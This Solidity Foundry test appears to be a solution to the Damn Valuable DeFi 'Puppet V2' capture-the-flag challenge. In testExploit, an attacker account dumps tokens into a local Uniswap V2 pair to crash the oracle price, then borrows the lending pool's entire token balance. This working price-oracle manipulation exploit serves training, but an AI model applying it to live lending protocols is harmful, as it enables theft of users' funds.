// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Utilities} from "../../utils/Utilities.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH} from "../../../lib/solmate/src/tokens/WETH.sol";
import {PuppetV2Pool} from "../../../src/Contracts/puppet-v2/PuppetV2Pool.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/puppet-v2/Interfaces.sol";

contract PuppetV2 is Test {
    // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;

    // attacker will start with 10_000 DVT and 20 ETH
    uint256 constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant ATTACKER_INITIAL_ETH_BALANCE = 20 ether;

    // pool will start with 1_000_000 DVT
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint256 constant DEADLINE = 10_000_000;

    IUniswapV2Pair uniswapV2Pair;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;

    DamnValuableToken dvt;
    WETH weth;

    PuppetV2Pool pool;
    address payable attacker;
    address payable deployer;

    function setUp() public {
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        deployer = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("deployer")))))
        );
        vm.label(deployer, "deployer");

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        weth = new WETH();
        vm.label(address(weth), "WETH");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt),
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(dvt), address(weth))
        );

        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        // Deploy the lending pool
        pool = new PuppetV2Pool(
            address(weth),
            address(dvt),
            address(uniswapV2Pair),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(pool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(pool.calculateDepositOfWETHRequired(1 ether), 0.3 ether);

        assertEq(
            pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE),
            300_000 ether
        );
    }

    function testExploit() public {
        address[] memory paths = new address[](2);
        address wethPath = address(weth);
        address dvtPath = address(dvt);
        paths[0] = dvtPath;
        paths[1] = wethPath;

        vm.startPrank(attacker);

        // First, we have to take as much ETH as possible from the ETH-DVT Pair
        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            dvt.balanceOf(attacker),
            9e18,
            paths,
            attacker,
            DEADLINE
        );
        assertGt(attacker.balance, ATTACKER_INITIAL_ETH_BALANCE);

        weth.approve(address(pool), attacker.balance);
        weth.deposit{value: attacker.balance}();

        // Then we just simply borrow all the DVT tokens out of the pool
        pool.borrow(dvt.balanceOf(address(pool)));
        validation();
    }

    function validation() public {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(pool)), 0);
    }
}
